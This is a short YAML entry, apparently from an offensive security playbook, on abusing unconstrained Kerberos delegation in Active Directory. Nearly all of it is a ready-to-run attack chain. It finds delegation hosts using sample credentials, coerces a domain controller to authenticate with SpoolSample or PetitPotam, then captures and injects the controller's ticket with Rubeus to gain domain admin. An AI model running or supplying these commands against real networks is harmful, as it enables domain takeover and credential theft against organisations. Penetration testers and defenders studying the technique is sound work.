---
description: |
  Exploit unconstrained Kerberos delegation — computers trusted for delegation cache TGTs of authenticating users. Coerce a DC to authenticate, capture its TGT, and gain domain admin.
commands:
  - have: Credentials
    cmd: |
      # Find unconstrained delegation computers
      findDelegation.py senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27

      # Coerce DC to authenticate to unconstrained host
      SpoolSample.exe DC01 UNCONSTRAINED_HOST
      # or: PetitPotam.py UNCONSTRAINED_HOST DC01

      # Monitor for incoming TGTs and use captured ticket
      Rubeus.exe monitor /interval:5 /nowrap
      Rubeus.exe ptt /ticket:base64_ticket
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
techniques:
  - Delegation_Abuse
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html
  - https://github.com/GhostPack/Rubeus
  - https://github.com/leechristensen/SpoolSample
  - https://github.com/topotam/PetitPotam
---
